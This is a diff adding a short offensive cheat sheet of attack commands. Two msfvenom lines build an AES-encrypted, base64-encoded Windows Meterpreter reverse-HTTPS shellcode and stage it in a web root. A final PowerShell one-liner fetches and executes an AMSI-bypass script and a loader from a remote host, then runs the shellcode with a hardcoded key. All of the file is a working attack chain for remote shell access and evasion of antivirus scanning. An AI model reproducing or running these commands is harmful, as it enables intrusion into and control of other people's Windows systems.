@@ -1,0 +1,6 @@
+msfvenom -f raw -p windows/x64/meterpreter_reverse_https lhost=$(/sbin/ifconfig tun0 | grep 'inet' | cut -d: -f2 | awk '{ print $2}' | xargs) lport=80 exitfunc=thread | openssl enc -aes-128-cbc -e -K 6c6172706c6172706c6172706c617270 -iv 6c6172706c6172706c6172706c617270 | base64 -w 0 > /var/www/html/shc.txt
+
+# No if config
+msfvenom -f raw -p windows/x64/meterpreter_reverse_https lhost=$(ip addr show dev eth0 | grep 'inet ' | cut -d/ -f1 | awk '{ print $2}' | xargs) lport=8443 exitfunc=thread | openssl enc -aes-128-cbc -e -K 6c6172706c6172706c6172706c617270 -iv 6c6172706c6172706c6172706c617270 | base64 -w 0 > /var/www/html/shc.txt
+
+$scheme = "http"; $port = "80"; $ip = "1.1.1.1"; iex(iwr "${scheme}://${ip}:${port}/undec-amsi.txt" -usebasicparsing); iex(iwr "${scheme}://${ip}:${port}/run.txt" -usebasicparsing); invoke-runner -ip $ip -aeskey "bGFycGxhcnBsYXJwbGFycA==" -aesiv "bGFycGxhcnBsYXJwbGFycA==" -port $port -scheme $scheme
